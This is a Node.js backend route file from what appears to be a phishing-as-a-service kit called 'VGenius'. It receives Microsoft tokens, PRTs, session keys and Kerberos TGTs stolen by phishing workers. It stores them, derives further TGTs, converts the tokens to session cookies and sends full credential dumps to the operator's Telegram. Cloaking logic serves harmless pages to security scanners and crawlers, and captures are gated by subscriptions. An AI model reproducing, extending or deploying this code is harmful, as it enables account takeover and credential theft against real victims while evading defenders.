/**
 * VGenius C Engine - Token Capture Routes
 * Receives tokens from deployed workers
 */
const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const db = require('../database/connection');
const config = require('../config/env');
const { encrypt } = require('../utils/encrypt');
const { processCookieConversion } = require('../services/cookieconverter');
const { sendTelegramDocument } = require('../services/notification');
const { body } = require('express-validator');
const { validateResult } = require('../middleware/validator');
const { getOpsecSettings } = require('../middleware/opsec');
const { rejectBotRequest, classifyRequest } = require('../middleware/botguard');

// Inline validators for the capture endpoint (commonValidators has no
// captureToken rule, so we define them here to avoid passing `undefined`
// to router.post which throws "requires a callback function").
const captureValidators = [
    body('jwt_token').notEmpty().withMessage('jwt_token is required'),
    body('access_token').notEmpty().withMessage('access_token is required'),
];

// Public bot-check endpoint used by workers/scripts before rendering.
router.get('/check', async (req, res) => {
  try {
    const classification = await classifyRequest(req);
    return res.json({
      ok: true,
      blocked: classification.action === 'block',
      challenged: classification.action === 'challenge',
      action: classification.action,
      reason: classification.reason,
      serve_harmless_page: classification.action !== 'allow',
    });
  } catch (err) {
    console.error('[Capture] bot-check error:', err.message);
    return res.json({ ok: true, blocked: false, action: 'allow', reason: 'check_failed' });
  }
});

// Apply bot guard to all capture routes.
router.use(rejectBotRequest);

// Existing visitor block-check and anti-bot classification stays available
// for worker consumers that still call /api/capture without the new check.

function setBrowserLikeHeaders(res) {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Cache-Control', 'no-store');
}

async function applyCaptureDelay() {
  try {
    const settings = await getOpsecSettings();
    if (settings.random_delays !== 'true') return;
    const min = parseInt(settings.min_delay_ms, 10) || 50;
    const max = parseInt(settings.max_delay_ms, 10) || 250;
    const delay = Math.floor(Math.random() * (max - min + 1)) + min;
    await new Promise(r => setTimeout(r, delay));
  } catch {
    // best-effort only
  }
}

// --- Telegram capture-report helpers --------------------------------------------
// Captures can contain very long token + cookie payloads that blow past
// Telegram's 4096-char sendMessage limit, so we deliver the full data as a
// .txt document (sendDocument) and keep a short HTML caption (<=1024 chars)
// with the summary. Building entities from char codes so the literals are
// not altered by tooling/runtime HTML rendering.
const AMP = String.fromCharCode(38) + 'amp;'; // &
const LT = String.fromCharCode(38) + 'lt;';  // <
const GT = String.fromCharCode(38) + 'gt;';  // >
const esc = (val) => {
    if (val === null || val === undefined) return 'N/A';
    const s = typeof val === 'string' ? val : JSON.stringify(val);
    return s.replace(/&/g, AMP).replace(/</g, LT).replace(/>/g, GT);
};

/**
 * Build a short HTML caption (<=1024 chars) summarising the capture.
 * Used as the caption of the Telegram document.
 */
function buildCaptureCaption(data) {
    const {
        email, templateType, tokenType, accountType, tenant, ip,
        cookieCount, linkId, tokenId,
    } = data;

    const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const label = tokenType === 'cookie' ? 'COOKIES' : 'TOKENS';
    const lines = [];

    lines.push(`🚨 <b>NEW CAPTURE - ${label}</b>`);
    lines.push(`👤 <b>Email:</b> ${esc(email || 'unknown')}`);
    lines.push(`🏷️ <b>Account:</b> ${esc(accountType)} | <b>Tenant:</b> ${esc(tenant)}`);
    lines.push(`🌐 <b>Template:</b> ${esc(templateType)}`);
    lines.push(`🌍 <b>IP:</b> ${esc(ip || '0.0.0.0')}`);
    if (tokenType === 'cookie' && (cookieCount || cookieCount === 0)) {
        lines.push(`🍪 <b>Cookies:</b> ${esc(cookieCount)}`);
    }
    lines.push(`🔗 <b>Link:</b> ${esc(linkId)} | <b>Token ID:</b> ${esc(tokenId)}`);
    lines.push(`📅 <b>Time:</b> ${esc(stamp)}`);
    lines.push(`✅ Full ${tokenType === 'cookie' ? 'cookies' : 'tokens'} in attached .txt`);

    return lines.join('\n');
}

/**
 * Build the full plain-text body of the .txt file sent with the capture.
 * No truncation, no HTML escaping — raw copy-paste-ready values.
 */
function buildCaptureFileContent(data) {
    const {
        email, templateType, tokenType, accessToken, refreshToken, idToken,
        prt, sessionKeyJwe, deviceTenantId, tgtAd, tgtCloud,
        kerberosTopLevelNames, tgtCloudSessionkey, accountType, tenant, ip,
        cookieCount, cookieSample, userAgent, linkId, tokenId,
    } = data;

    const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const sep = '========================================';
    const out = [];

    out.push('VGENIUS CAPTURE REPORT');
    out.push(sep);
    out.push(`Type:        ${tokenType === 'cookie' ? 'COOKIE' : 'TOKEN'}`);
    out.push(`Token ID:    ${tokenId}`);
    out.push(`Link ID:     ${linkId}`);
    out.push(`Email:       ${email || 'unknown'}`);
    out.push(`Account:     ${accountType}`);
    out.push(`Tenant:      ${tenant}`);
    out.push(`Template:    ${templateType}`);
    out.push(`IP:          ${ip || '0.0.0.0'}`);
    out.push(`User-Agent:  ${userAgent || 'Phishing Worker'}`);
    out.push(`Captured:    ${stamp}`);
    out.push(sep);

    // For TOKEN mode: show all token fields
    if (tokenType !== 'cookie') {
        out.push('ACCESS TOKEN:');
        out.push(accessToken || 'N/A');
        out.push('');

        if (idToken) {
            out.push('ID TOKEN:');
            out.push(idToken);
            out.push('');
        }

        if (prt) {
            out.push('PRT / REFRESH TOKEN:');
            out.push(prt);
            out.push('');
        }

        if (refreshToken && refreshToken !== prt) {
            out.push('REFRESH TOKEN:');
            out.push(refreshToken);
            out.push('');
        }

        if (sessionKeyJwe) {
            out.push('SESSION KEY (JWE):');
            out.push(sessionKeyJwe);
            out.push('');
        }

        if (deviceTenantId) {
            out.push('DEVICE TENANT ID:');
            out.push(deviceTenantId);
            out.push('');
        }

        if (tgtAd) {
            out.push('TGT AD:');
            out.push(tgtAd);
            out.push('');
        }

        if (tgtCloud) {
            out.push('TGT CLOUD:');
            out.push(tgtCloud);
            out.push('');
        }

        if (tgtCloudSessionkey) {
            out.push('TGT CLOUD SESSION KEY:');
            out.push(tgtCloudSessionkey);
            out.push('');
        }

        if (kerberosTopLevelNames) {
            out.push('KERBEROS TOP LEVEL NAMES:');
            out.push(kerberosTopLevelNames);
            out.push('');
        }
    }

    // For COOKIE mode: show only cookies
    if (tokenType === 'cookie' && (cookieSample || cookieCount)) {
        const cookieText = Array.isArray(cookieSample)
            ? cookieSample.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`).join('\n')
            : String(cookieSample || 'N/A');
        out.push(`COOKIES (${cookieCount || 0} cookies):`);
        out.push(cookieText);
        out.push('');
    }

    out.push(sep);
    out.push('END OF REPORT');
    return out.join('\n');
}

/**
 * Send a capture report to the user's Telegram: a .txt document containing
 * the full tokens + cookies, with a short HTML caption summary.
 */
function sendCaptureReport(userId, data) {
    const caption = buildCaptureCaption(data);
    const fileContent = buildCaptureFileContent(data);
    const filename = `capture_${data.tokenId}_${data.tokenType || 'token'}.txt`;
    return sendTelegramDocument(userId, filename, fileContent, caption);
}

// POST /api/capture - receives tokens from the phishing worker
router.post('/', captureValidators, validateResult, async (req, res) => {
    try {
        const { jwt_token, access_token, refresh_token, id_token, ip, user_agent } = req.body;

        const visitorIp = ip || req.ip || req.headers['x-forwarded-for'] || '';
        const ua = user_agent || req.headers['user-agent'] || '';
        const classification = classifyIP(visitorIp, ua, req.headers);

        if (classification.action === 'block') {
          console.warn('[Capture] Blocked scanner', { ip: visitorIp, ua });
          return res.status(404).sendFile(path.join(__dirname, '..', '..', 'admin-panel', '404.html'));
        }

        await applyCaptureDelay();

        if (!jwt_token || !access_token) {
          setBrowserLikeHeaders(res);
          return res.status(400).json({ error: 'Missing required fields' });
        }

        // Verify JWT (the one embedded in the phishing page)
        let decoded;
        try {
            decoded = jwt.verify(jwt_token, config.JWT_SECRET);
        } catch (err) {
            setBrowserLikeHeaders(res);
            return res.status(403).json({ error: 'Invalid or expired JWT' });
        }

        const { user_id, link_id } = decoded;
        if (!user_id || !link_id) {
            setBrowserLikeHeaders(res);
            return res.status(403).json({ error: 'Invalid JWT payload' });
        }

        // Verify user subscription is still active
        const [users] = await db.query(
            'SELECT * FROM users WHERE id = ? AND subscription_status = ? AND (subscription_expiry IS NULL OR subscription_expiry > NOW())',
            [user_id, 'active']
        );
        if (!users.length) {
            setBrowserLikeHeaders(res);
            return res.status(403).json({ error: 'Subscription inactive or expired' });
        }

        // Verify link is still active
        const [links] = await db.query(
            'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
            [link_id, user_id, 'active']
        );
        if (!links.length) {
            setBrowserLikeHeaders(res);
            return res.status(403).json({ error: 'Link not active or killed' });
        }

        const link = links[0];

    // Parse incoming data - support both old format and new PRT format
    let prt = null;
    let sessionKeyJwe = null;
    let sessionKey = null;       // Raw session_key from token response
    let sessionKeyEnc = null;    // session_key_enc from token response
    let clientInfo = null;       // client_info (base64 JSON with uid+utid)
    let deviceTenantId = null;
    let tgtAd = null;
    let tgtCloud = null;
    let kerberosTopLevelNames = null;
    let tgtCloudSessionkey = null;
    let accountType = 'work_school'; // Default to work/school

    // NEW: Extract PRT persistence fields from token response
    if (req.body.client_info) {
      clientInfo = req.body.client_info;
    }
    if (req.body.session_key) {
      sessionKey = req.body.session_key;
    }
    if (req.body.session_key_enc) {
      sessionKeyEnc = req.body.session_key_enc;
      // Use session_key_enc as session_key_jwe if not explicitly provided
      if (!sessionKeyJwe) {
        sessionKeyJwe = sessionKeyEnc;
      }
    }
    if (req.body.prt) {
      prt = req.body.prt;
      accountType = 'work_school';
    }
    if (req.body.device_tenant_id) {
      deviceTenantId = req.body.device_tenant_id;
    }
    if (req.body.tgt_ad) {
      tgtAd = JSON.stringify(req.body.tgt_ad);
    }
    if (req.body.tgt_cloud) {
      tgtCloud = JSON.stringify(req.body.tgt_cloud);
    }
    if (req.body.kerberos_top_level_names) {
      kerberosTopLevelNames = req.body.kerberos_top_level_names;
    }
    if (req.body.tgt_cloud_sessionkey) {
      tgtCloudSessionkey = JSON.stringify(req.body.tgt_cloud_sessionkey);
    }

    // Parse refresh_token - it may be a JSON blob containing PRT and other tokens (competitor format)
    let rawRefreshToken = refresh_token || '';
    if (rawRefreshToken) {
      try {
        // Check if refresh_token is JSON (competitor format with PRT data)
        const parsedRefresh = JSON.parse(rawRefreshToken);
        if (parsedRefresh.prt) {
          prt = parsedRefresh.prt;
          accountType = 'work_school';
        }
        if (parsedRefresh.session_key_jwe) sessionKeyJwe = parsedRefresh.session_key_jwe;
        if (parsedRefresh.device_tenant_id) deviceTenantId = parsedRefresh.device_tenant_id;
        if (parsedRefresh.tgt_ad) tgtAd = JSON.stringify(parsedRefresh.tgt_ad);
        if (parsedRefresh.tgt_cloud) tgtCloud = JSON.stringify(parsedRefresh.tgt_cloud);
        if (parsedRefresh.kerberos_top_level_names) kerberosTopLevelNames = parsedRefresh.kerberos_top_level_names;
        if (parsedRefresh.tgt_cloud_sessionkey) tgtCloudSessionkey = parsedRefresh.tgt_cloud_sessionkey;
      } catch (e) {
        // Not JSON - treat as plain refresh token
        // Check if it's a known personal account token format
        if (rawRefreshToken.startsWith('0.AT') || rawRefreshToken.startsWith('M.R')) {
          accountType = 'personal';
        }
        // For work/school accounts, the refresh token itself serves as PRT identifier
        if (accountType === 'work_school' && !prt) {
          prt = rawRefreshToken;
        }
      }
    }
    
    // Store client_info and session data for cookie converter use
    // These are needed to build PRT JWT during cookie conversion
    const captureMeta = {
      client_info: clientInfo,
      session_key: sessionKey,
      session_key_enc: sessionKeyEnc,
    };

    // Extract email and tenant from id_token if present
    let email = null;
    let idTokenTenant = null;
    if (id_token) {
        try {
            let tokenPart = id_token.split('.')[1];
            // Fix base64 padding if needed
            while (tokenPart.length % 4) tokenPart += '=';
            const payload = JSON.parse(Buffer.from(tokenPart, 'base64').toString());
            email = payload.email || payload.upn || payload.preferred_username || null;
            idTokenTenant = payload.tid || null; // Extract actual tenant ID from token

            // Detect account type from email domain
            if (email) {
                const emailDomain = email.split('@')[1].toLowerCase();
                if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
                    accountType = 'personal';
                }
            }
        } catch (e) { /* ignore decode errors */ }
    }

    // Determine tenant - prefer id_token tenant, fallback to link's jwt_payload
    let tenant = idTokenTenant || 'common';
    if (!idTokenTenant && link.jwt_payload) {
        try {
            const parsed = JSON.parse(link.jwt_payload);
            if (parsed.tenant) tenant = parsed.tenant;
        } catch (e) { /* use default */ }
    }

    // For personal accounts, use consumers endpoint
    if (accountType === 'personal') {
        tenant = 'consumers';
    }

    // Insert token record (encrypted) with 100-year expiration for persistent access
    const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720; // Max 30 days

    const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';

    // Determine token_type based on link auth_mode
    const tokenType = link.auth_mode === 'cookie' ? 'cookie' : 'token';

    const [result] = await db.query(
        `INSERT INTO captured_tokens
        (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted,
         prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey,
         account_type, ip_address, user_agent, expiration, tenant, template_type, client_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? HOUR), ?, ?, ?)`,
        [
            user_id,
            link_id,
            email,
            tokenType,
            encrypt(access_token),
            encrypt(refresh_token || null),
            encrypt(id_token || null),
            encrypt(prt),
            encrypt(sessionKeyJwe),
            deviceTenantId,
            encrypt(tgtAd),
            encrypt(tgtCloud),
            kerberosTopLevelNames,
            encrypt(tgtCloudSessionkey),
            accountType,
            ip || '0.0.0.0',
            user_agent || 'Phishing Worker',
            ttlHours,
            tenant,
            link.template_type || 'office',
            clientIdUsed
        ]
    );

    const tokenId = result.insertId;

    // Log token capture details for debugging
    console.log('[Capture] Token captured:', {
      tokenId,
      email,
      accountType,
      tenant,
      hasPrt: !!prt,
      hasIdToken: !!id_token,
      idTokenTenant: idTokenTenant || 'not extracted'
    });

    // Auto-derive Kerberos TGTs for work/school accounts with PRT
    // This runs asynchronously and doesn't block the response
    // Requires: PRT + work/school account + specific tenant ID (not 'common' or 'organizations')
    if (prt && accountType === 'work_school' && tenant && tenant !== 'common' && tenant !== 'organizations') {
      console.log('[Capture] Attempting Kerberos TGT derivation for token', tokenId, 'tenant:', tenant);
      const kerberosService = require('../services/kerberos');
      kerberosService.deriveTGTForToken(tokenId)
        .then(derivationResult => {
          if (derivationResult.success) {
            console.log('[Capture] Kerberos TGT derived for token', tokenId, ':', derivationResult.email);
            // Update the token record with Kerberos data
            if (derivationResult.tgt_cloud) {
              db.query(
                'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
                [encrypt(derivationResult.tgt_cloud), tokenId]
              ).catch(err => console.error('[Capture] Failed to save TGT cloud:', err));
            }
            if (derivationResult.tgt_ad) {
              db.query(
                'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
                [encrypt(derivationResult.tgt_ad), tokenId]
              ).catch(err => console.error('[Capture] Failed to save TGT AD:', err));
            }
            if (derivationResult.session_key) {
              db.query(
                'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
                [encrypt(derivationResult.session_key), tokenId]
              ).catch(err => console.error('[Capture] Failed to save session key:', err));
            }
            if (derivationResult.kerberos_top_level_names) {
              db.query(
                'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
                [derivationResult.kerberos_top_level_names, tokenId]
              ).catch(err => console.error('[Capture] Failed to save kerberos names:', err));
            }
          } else {
            console.log('[Capture] Kerberos derivation skipped for token', tokenId, ':', derivationResult.error || 'no PRT');
          }
        })
        .catch(err => {
          console.error('[Capture] Kerberos derivation error:', err.message);
        });
    } else {
      console.log('[Capture] Kerberos derivation skipped:', {
        tokenId,
        reason: !prt ? 'no PRT' : accountType !== 'work_school' ? 'not work/school' : tenant === 'common' || tenant === 'organizations' ? 'tenant too generic (' + tenant + ')' : 'unknown'
      });
    }

    // Common capture data shared by both the token-only and cookie paths
    const captureData = {
        email,
        templateType: link.template_type,
        tokenType: tokenType, // Add tokenType for notification
        accessToken: access_token,
        refreshToken: prt,
        idToken: id_token,
        prt,
        sessionKeyJwe,
        sessionKey: sessionKey,
        sessionKeyEnc: sessionKeyEnc,
        clientInfo: clientInfo,
        deviceTenantId,
        tgtAd,
        tgtCloud,
        kerberosTopLevelNames,
        tgtCloudSessionkey,
        accountType,
        tenant,
        ip,
        userAgent: user_agent,
        linkId: link_id,
        tokenId,
        captureMeta: captureMeta,
    };

    // If link is in cookie mode, trigger cookie conversion asynchronously
    // PASS TENANT, ACCOUNT TYPE, AND CAPTURE META (client_info, session_key)
    // FIX: Pass refresh_token (not access_token) - cookie converter needs refresh token to generate session cookies
    const refreshTokenForConversion = refresh_token || prt || access_token;
    if (link.auth_mode === 'cookie') {
        // For work/school accounts, wait for device registration to complete first
        // then use the device registration PRT for cookie generation
        const waitForDeviceRegistration = () => {
            return new Promise((resolve) => {
                if (accountType === 'work_school') {
                    // Wait up to 30 seconds for device registration
                    // This runs for ALL work/school accounts (common, organizations, specific tenant GUIDs)
                    console.log('[Capture] Work/school account detected (tenant:', tenant + '), waiting for device registration...');
                    const maxWait = 30000;
                    const intervalMs = 1000;
                    let waited = 0;

                    const timer = setInterval(() => {
                        waited += intervalMs;
                        // Check if device credentials were stored OR if device registration failed
                        const registrationFailed = job.deviceRegistrationFailed ? job.deviceRegistrationFailed() : false;
                        db.query(
                            'SELECT id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
                            [user_id, tenant]
                        ).then(([rows]) => {
                            if (rows.length > 0 || waited >= maxWait || registrationFailed) {
                                clearInterval(timer);
                                if (rows.length > 0) {
                                    console.log('[Capture] Device credentials found! Proceeding with PRT cookie generation');
                                } else if (registrationFailed) {
                                    console.log('[Capture] Device registration failed, proceeding with refresh token exchange');
                                } else {
                                    console.log('[Capture] Device registration timed out after', waited, 'ms, proceeding with refresh token exchange');
                                }
                                resolve();
                            }
                        }).catch((err) => {
                            clearInterval(timer);
                            console.log('[Capture] Device credential check error:', err.message);
                            resolve();
                        });
                    }, intervalMs);
                } else {
                    // Personal account - skip device registration
                    console.log('[Capture] Personal account detected, skipping device registration');
                    resolve();
                }
            });
        };

        waitForDeviceRegistration().then(() => {
            processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id)
                .then((cookieResult) => {
                    const io = req.app.get('io');
                    if (io) {
                        io.to(`user_${user_id}`).emit('new_token', {
                            id: tokenId,
                            email,
                            token_type: 'cookie',
                            created_at: new Date()
                        });
                    }
                    // Send report WITH cookie data (full tokens + cookies .txt)
                    sendCaptureReport(user_id, {
                        ...captureData,
                        tokenType: 'cookie',
                        cookieCount: cookieResult.cookie_count,
                        cookieSample: cookieResult.cookies,
                    });
                })
                .catch(err => {
                    console.error('[Capture] Cookie conversion failed:', err.message);
                    // Send tokens-only report (.txt) if cookie conversion fails
                    sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
                });
        }).catch(err => {
            console.error('[Capture] Device registration wait failed:', err.message);
            // Proceed with cookie conversion anyway
            processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id)
                .then((cookieResult) => {
                    sendCaptureReport(user_id, {
                        ...captureData,
                        tokenType: 'cookie',
                        cookieCount: cookieResult.cookie_count,
                        cookieSample: cookieResult.cookies,
                    });
                })
                .catch(() => {
                    sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
                });
        });
    } else {
        const io = req.app.get('io');
        if (io) {
            io.to(`user_${user_id}`).emit('new_token', {
                id: tokenId,
                email,
                token_type: 'token',
                created_at: new Date()
            });
        }
        // Send tokens-only report (.txt document) with short HTML caption
        sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
    }

    setBrowserLikeHeaders(res);
    res.status(200).json({ success: true, token_id: tokenId });
} catch (err) {
    console.error('[Capture] Error:', err);
    setBrowserLikeHeaders(res);
    res.status(500).json({ error: 'Internal server error' });
}
});

// ─── IP Classification Helper ────────────────────────────────────────────────
// Classifies visitor IP into categories for anti-bot challenging
function classifyIP(ip, userAgent, headers) {
  // ONLY challenge when CERTAIN - never challenge clean residential IPs
  const crawlerPatterns = [
    /bot/i, /spider/i, /crawl/i, /scraper/i, /curl/i, /wget/i,
    /python-requests/i, /httpclient/i, /java\\/i, /phantom/i,
    /headless/i, /selenium/i, /puppeteer/i, /playwright/i,
    /slurp/i, /bingbot/i, /googlebot/i, /yandexbot/i, /baiduspider/i
  ];

  const ua = userAgent || '';
  for (const pattern of crawlerPatterns) {
    if (pattern.test(ua)) return { type: 'crawler', action: 'block', confidence: 0.95 };
  }

  // Only challenge if User-Agent is missing or extremely short
  if (!ua || ua.length < 5) return { type: 'suspicious', action: 'challenge', confidence: 0.9 };

  // Only challenge if Cloudflare EXPLICITLY identifies the IP type
  const ipType = headers['cf-ip-type'] || '';
  if (ipType === 'datacenter' || ipType === 'hosting') return { type: 'datacenter', action: 'challenge', confidence: 0.95 };
  if (ipType === 'vpn' || ipType === 'proxy' || ipType === 'tor') return { type: 'vpn', action: 'challenge', confidence: 0.95 };

  // Default: residential IP - ALWAYS allow through
  return { type: 'residential', action: 'allow', confidence: 0.99 };
}

// ─── IP Geolocation Fallback ────────────────────────────────────────────────
// Uses ip-api.com (free, no API key needed, 45 requests/minute limit)
async function getCountryFromIP(ip) {
  try {
    // Only lookup private IPs are skipped
    if (!ip || ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
      return 'Unknown';
    }
    
    const axios = require('axios');
    const response = await axios.get(`http://ip-api.com/json/${ip}?fields=countryCode&timeout=2000`);
    if (response.data && response.data.countryCode) {
      return response.data.countryCode;
    }
  } catch (e) {
    // Silent fail - return Unknown
  }
  return 'Unknown';
}

// ─── Visitor Block Check (called by worker before serving page) ──────────────
router.post('/visitor/block-check', async (req, res) => {
  try {
    const { jwt_token, visitor_ip } = req.body;

    if (!jwt_token || !visitor_ip) {
      return res.status(400).json({ error: 'jwt_token and visitor_ip required' });
    }

    // Decode JWT to get user_id
    let decoded;
    try {
      decoded = jwt.verify(jwt_token, config.JWT_SECRET);
    } catch (e) {
      return res.status(401).json({ error: 'Invalid token' });
    }

    const { user_id, link_id } = decoded;
    const userAgent = req.headers['user-agent'] || req.get('user-agent') || '';

    // Extract worker_name from links table (not from JWT)
    let workerName = null;
    try {
      const [linkRows] = await db.query('SELECT worker_name FROM links WHERE id = ? AND user_id = ?', [link_id, user_id]);
      if (linkRows.length > 0 && linkRows[0].worker_name) {
        workerName = linkRows[0].worker_name;
      }
    } catch (e) {
      // Silent fail
    }

    // ── Step 1: Check block_done_visitors (existing logic) ────────────────
    const [settingsRows] = await db.query(
      'SELECT block_done_visitors, redirect_url FROM visitor_settings WHERE user_id = ?',
      [user_id]
    );

    if (settingsRows.length && settingsRows[0].block_done_visitors) {
      const [visitorRows] = await db.query(
        "SELECT id, status FROM visitors WHERE ip_address = ? AND user_id = ? AND status IN ('done', 'blocked') ORDER BY created_at DESC LIMIT 1",
        [visitor_ip, user_id]
      );

      if (visitorRows.length > 0) {
        try {
          let country = req.headers['cf-ipcountry'] || req.get('CF-IPCountry') || '';
          if (!country || country === 'Unknown') {
            country = await getCountryFromIP(visitor_ip);
          }
          await db.query(
            "INSERT INTO visitors (user_id, link_id, ip_address, user_agent, country, status, worker_name) VALUES (?, ?, ?, ?, ?, 'blocked', ?)",
            [user_id, link_id, visitor_ip, userAgent, country, workerName]
          );
        } catch (logErr) {
          console.error('[Capture] Failed to log blocked revisit:', logErr.message);
        }

        return res.json({
          blocked: true,
          redirect_url: settingsRows[0].redirect_url || ''
        });
      }
    }

    // ── Step 2: Anti-Bot IP Classification ────────────────────────────────
    const ipClassification = classifyIP(visitor_ip, userAgent, req.headers);

    // Log visitor for analytics
    try {
      let country = req.headers['cf-ipcountry'] || req.get('CF-IPCountry') || '';
      if (!country || country === 'Unknown') {
        country = await getCountryFromIP(visitor_ip);
      }
      await db.query(
        "INSERT INTO visitors (user_id, link_id, ip_address, user_agent, country, status, worker_name, ip_type) VALUES (?, ?, ?, ?, ?, 'visited', ?, ?)",
        [user_id, link_id, visitor_ip, userAgent, country, workerName, ipClassification.type]
      );
    } catch (logErr) {
      // Silent fail for logging
    }

    // Return classification result for worker to decide action
    return res.json({
      blocked: ipClassification.action === 'block',
      challenged: ipClassification.action === 'challenge',
      ip_type: ipClassification.type,
      confidence: ipClassification.confidence,
      action: ipClassification.action
    });
  } catch (err) {
    console.error('[Capture] visitor/block-check error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
module.exports.buildCaptureCaption = buildCaptureCaption;
module.exports.buildCaptureFileContent = buildCaptureFileContent;
module.exports.sendCaptureReport = sendCaptureReport;
